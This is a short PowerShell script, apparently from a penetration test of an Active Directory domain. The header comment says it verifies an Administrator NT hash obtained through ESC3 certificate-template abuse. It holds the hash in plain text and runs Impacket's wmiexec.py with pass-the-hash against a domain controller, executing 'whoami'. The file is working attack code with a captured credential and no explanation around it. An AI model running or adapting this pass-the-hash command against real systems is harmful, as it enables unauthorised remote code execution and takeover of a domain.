# Verify ESC3-derived administrator NT hash via wmiexec on dc01
$ErrorActionPreference = "Continue"
$hash = "aad3b435b51404eeaad3b435b51404ee:81c3b6443f148bf73bb3499791f1eb7b"
$py = "C:\Users\analyst_t1.CHILD\AppData\Local\Programs\Python\Python312\Scripts"
Write-Output "=== wmiexec with ESC3 admin hash (dc01 whoami) ==="
python "$py\wmiexec.py" -hashes $hash -no-pass cadre.local/Administrator@192.168.77.10 "whoami" 2>&1 | Select-Object -Last 15
Write-Output "WMIEXEC_RC $LASTEXITCODE"
